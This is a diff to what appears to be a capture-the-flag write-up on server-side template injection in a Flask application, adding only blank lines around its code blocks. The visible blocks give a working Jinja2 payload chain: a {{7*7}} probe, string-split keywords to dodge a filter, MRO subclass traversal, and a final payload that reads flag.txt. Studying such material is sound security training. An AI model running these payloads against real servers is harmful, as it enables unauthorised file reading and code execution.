@@ -265,7 +265,9 @@ To approach this task I focused on the user input _request.args['content']_ and 
 To detect this vulnerability I checked the following payload since it is a Flask application:
 
 ``` 
+
 {{7*7}} 
+
 ```
 
 <p align="left">
@@ -280,7 +282,9 @@ As we can see, the code is executed, therefore we can try to explote this vulner
 The purpose is to read the flag file (?) or to execute code in the server. For that, we will need to call the **File** class in order to read its content, so we can use MRO (Method Resolution Order) to map 
 
 ```
+
 {{""["__cl" + "ass__"]}}
+
 ```
 
 
@@ -289,7 +293,9 @@ The purpose is to read the flag file (?) or to execute code in the server. For t
 </p>
 
 ```
+
 {{""["__cl" + "ass__"].__mro__}}
+
 ```
 
 <p align="center">
@@ -298,7 +304,9 @@ The purpose is to read the flag file (?) or to execute code in the server. For t
 
 
 ```
+
 {{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()}}
+
 ```
 
 <p align="center">
@@ -361,7 +369,9 @@ Now, the [documentation](https://docs.python.org/3/library/importlib.html) is ch
 Following the documentation, we crafted the following payload:
 
 ```
+
 {{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[99]("flag.txt", "flag.txt").get_data("flag.txt")}}
+
 ```
 
 <p align="center">
